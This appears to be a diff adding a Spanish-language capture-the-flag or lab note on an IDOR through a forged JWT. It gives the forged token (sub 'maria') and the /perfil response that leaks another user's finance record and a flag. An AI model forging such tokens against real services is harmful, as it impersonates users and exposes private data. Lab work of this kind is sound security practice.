@@ -1,0 +1,3 @@
+# R3 IDOR via JWT: forjar sub=maria -> GET /perfil
+token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJtYXJpYSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzk1MTQwMzkxLCJleHAiOjE3OTUxNDM5OTF9.nCn22MzE3hXJe3YTsdH7rq-J41pzeoZDRgwRQLd1YjM
+{"usuario": "maria", "role": "user", "datos": "Legajo 1007 \u2014 Finanzas. Nota confidencial: FLAG{jwt_suplantacion_idor}"}
